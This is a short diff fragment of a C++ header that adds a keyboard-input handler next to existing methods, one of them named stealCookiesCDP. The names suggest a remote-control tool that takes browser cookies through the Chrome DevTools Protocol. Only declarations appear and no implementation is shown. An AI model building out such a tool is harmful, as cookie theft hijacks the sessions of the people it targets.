@@ -35,4 +35,6 @@ public:
     static json systemRestart(const json &);
 
     static json stealCookiesCDP(const json &);
+
+    static json handleKeyboardInput(const json &);
 };
